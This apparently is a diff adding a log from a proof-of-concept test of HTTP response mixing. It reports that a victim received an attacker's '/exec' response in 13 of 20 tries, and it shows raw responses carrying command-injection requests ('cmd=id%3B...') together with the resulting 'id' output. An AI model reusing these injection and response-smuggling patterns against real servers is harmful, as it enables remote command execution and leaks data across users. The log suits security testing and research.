@@ -1,0 +1,50 @@
+CONTROL b'HTTP/1.1 200 OK'
+victim served the ATTACKER'S /exec RESPONSE incl. uid output: 13 / 20
+--- pair 0 
+ HTTP/1.1 200 OK
+Content-Length: 226
+Connection: close
+content-type: text/plain
+x-counter: 2
+x-sock: 1
+x-port: 42100
+
+CTR=2 SOCK=1 PORT=42100 PID=4057722 TOKS=3
+LINE:GET //exec?cmd=id%3BEXECMARK0&rp=1 HTTP/1.1
+EXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom
+--- pair 2 
+ HTTP/1.1 200 OK
+Content-Length: 226
+Connection: close
+content-type: text/plain
+x-counter: 4
+x-sock: 1
+x-port: 42100
+
+CTR=4 SOCK=1 PORT=42100 PID=4057722 TOKS=3
+LINE:GET //exec?cmd=id%3BEXECMARK1&rp=1 HTTP/1.1
+EXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom
+--- pair 3 
+ HTTP/1.1 200 OK
+Content-Length: 226
+Connection: close
+content-type: text/plain
+x-counter: 7
+x-sock: 2
+x-port: 42100
+
+CTR=7 SOCK=2 PORT=42100 PID=4057722 TOKS=3
+LINE:GET //exec?cmd=id%3BEXECMARK3&rp=1 HTTP/1.1
+EXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom
+--- pair 5 
+ HTTP/1.1 200 OK
+Content-Length: 226
+Connection: close
+content-type: text/plain
+x-counter: 9
+x-sock: 2
+x-port: 42100
+
+CTR=9 SOCK=2 PORT=42100 PID=4057722 TOKS=3
+LINE:GET //exec?cmd=id%3BEXECMARK4&rp=1 HTTP/1.1
+EXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom
